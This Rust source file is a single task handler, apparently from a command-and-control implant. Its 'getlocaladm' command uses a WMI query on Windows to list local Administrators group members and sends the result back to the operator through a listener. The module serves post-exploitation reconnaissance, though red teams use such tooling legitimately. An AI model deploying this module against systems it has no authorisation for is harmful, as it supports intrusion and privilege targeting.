use crate::internal::listener::{TaskHandler};

#[cfg(target_os = "windows")]
use std::collections::HashMap;

pub static COMMAND: &str = "getlocaladm";
pub struct Command {}

impl TaskHandler for Command {
    fn handle(&self, _: String, args: Vec<String>) -> Result<String, Box<dyn std::error::Error>> {
        #[cfg(any(feature = "debug_assertions", feature = "debug"))]
        println!(
            "Executing command `{}` with args `{:?}`",
            COMMAND,
            args.clone()
        );

        if args.len() != 0 {
            return Ok("Invalid number of arguments received. Usage: 'getlocaladm'.".to_string());
        }

        #[cfg(target_os = "windows")]
        {
            let local_admins = get_local_admins();
            Ok(format!("Local Administrators: \n- {}", local_admins.join("\n- ")))
        }

        #[cfg(not(target_os = "windows"))]
        Ok(crate::internal::tasks::unsupported::reply(COMMAND))
    }
}

#[cfg(target_os = "windows")]
fn get_local_admins() -> Vec<String> {
    let mut local_admins: Vec<String> = Vec::new();

    let com_con = match wmi::COMLibrary::new() {
        Ok(c) => c,
        Err(_) => return local_admins,
    };

    let wmi_con = match wmi::WMIConnection::with_namespace_path("ROOT\\cimv2", com_con.into()) {
        Ok(w) => w,
        Err(_) => return local_admins,
    };

    let possible_local_admins: Vec<HashMap<String, String>> = wmi_con
        .raw_query("SELECT GroupComponent,PartComponent FROM Win32_GroupUser")
        .unwrap_or(Vec::new());

    for entry in possible_local_admins {
        let empty = "".to_string();
        let group_component = entry.get("GroupComponent").unwrap_or(&empty);
        let part_component = entry.get("PartComponent").unwrap_or(&empty).split("\"");
        let part_component_vec: Vec<&str> = part_component.collect();

        let user = match part_component_vec.len() {
            5 => format!("{}\\{}", part_component_vec.get(1).unwrap(), part_component_vec.get(3).unwrap()),
            _ => part_component_vec.join("\"")
        };

        match group_component.find("Administrators") {
            None => {}
            Some(_) => local_admins.insert(0, user)
        }
    }

    return local_admins;
}
